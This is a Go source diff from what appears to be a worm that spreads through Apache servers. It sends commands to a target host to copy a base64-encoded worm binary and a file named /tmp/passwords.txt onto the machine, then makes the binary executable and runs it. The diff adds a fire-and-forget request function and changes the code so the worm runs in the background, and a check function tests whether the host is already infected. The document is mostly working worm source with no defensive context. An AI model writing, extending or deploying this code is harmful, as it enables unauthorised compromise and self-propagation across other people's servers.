@@ -40,6 +40,13 @@ func MakeRequest(ip string, port string, commands string) string {
 	return string(resp)
 }
 
+func MakeRequest2(ip string, port string, commands string) {
+	conn, _ := net.Dial("tcp", ip+":"+port)
+	rt := PrepareRequest(ip, commands)
+	conn.Write([]byte(rt))
+	return
+}
+
 func ApacheCheckInfection(ip string, port string) bool {
 	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
 	commands := fmt.Sprintf(commandsTemplate,executeCommands)
@@ -61,9 +68,8 @@ func ApacheInfect(ip string, port string) bool {
 	file64 = base64.StdEncoding.EncodeToString(file)
 	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/passwords.txt")
 	MakeRequest(ip,port,commands)
-	commands = fmt.Sprintf("chmod u+x %s && %s", wormPath, wormPath)
+	commands = fmt.Sprintf("chmod u+x %s && %s &", wormPath, wormPath)
 	commands = fmt.Sprintf(commandsTemplate,commands)
-	resp := MakeRequest(ip,port,commands)
-	fmt.Println(resp)
+	MakeRequest2(ip,port,commands)
 	return ApacheCheckInfection(ip,port)
 }
